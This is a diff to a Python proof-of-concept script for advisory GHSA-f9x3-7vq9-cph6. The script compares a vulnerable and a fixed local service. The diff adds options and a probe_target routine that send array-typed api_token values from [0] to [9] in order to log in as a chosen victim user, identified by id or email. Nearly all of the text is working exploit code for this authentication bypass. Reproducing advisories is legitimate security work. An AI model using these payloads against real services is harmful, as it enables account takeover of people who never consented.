@@ -14,6 +14,8 @@ parser = argparse.ArgumentParser(description="GHSA-f9x3-7vq9-cph6 PoC")
 parser.add_argument("vuln_url", nargs="?", default="http://127.0.0.1:8891")
 parser.add_argument("fixed_url", nargs="?", default="http://127.0.0.1:8892")
 parser.add_argument("--proxy", help="proxy de inspecao (Burp/mitmproxy), ex.: 127.0.0.1:8080")
+parser.add_argument("--target", type=int, help="id do usuario alvo; enumera api_token [0..9]")
+parser.add_argument("--targetUser", help="email do usuario alvo; enumera api_token [0..9]")
 args = parser.parse_args()
 
 vuln_url = args.vuln_url
@@ -46,6 +48,29 @@ def post(base_url, payload):
     return response.status, parsed, elapsed_ms
 
 
+def exploit_line(app, base_url, payload):
+    status, body, elapsed_ms = post(base_url, payload)
+    who = body.get("authenticated_as", body.get("error", "-"))
+    via = f" via {args.proxy}" if args.proxy else ""
+    log.info("[*] %s POST %s -> %s %s (%d ms)%s",
+             app, json.dumps(payload), status, who, elapsed_ms, via)
+
+
+def probe_target():
+    for n in range(10):
+        payload = {"api_token": [n]}
+        status, body, elapsed_ms = post(vuln_url, payload)
+        who = body.get("authenticated_as", body.get("error", "-"))
+        uid = body.get("user_id", "-")
+        hit = (args.target is not None and body.get("user_id") == args.target) or \
+              (args.targetUser is not None and who == args.targetUser)
+        log.info('[*] probe {"api_token": [%d]} -> %s %s id=%s%s',
+                 n, status, who, uid, " <- target" if hit else "")
+        if hit:
+            return
+    log.info("alvo nao encontrado em [0..9]")
+
+
 probes = [
     ("vuln ", vuln_url, {"api_token": [0]}),
     ("vuln ", vuln_url, {"api_token": user_token}),
@@ -53,12 +78,11 @@ probes = [
 ]
 
 try:
-    for app, base_url, payload in probes:
-        status, body, elapsed_ms = post(base_url, payload)
-        who = body.get("authenticated_as", body.get("error", "-"))
-        via = f" via {args.proxy}" if args.proxy else ""
-        log.info("[*] %s POST %s -> %s %s (%d ms)%s",
-                 app, json.dumps(payload), status, who, elapsed_ms, via)
+    if args.target is not None or args.targetUser:
+        probe_target()
+    else:
+        for app, base_url, payload in probes:
+            exploit_line(app, base_url, payload)
 except OSError as error:
     log.error("%s (proxy: %s)", error, args.proxy or "direto")
     sys.exit(1)
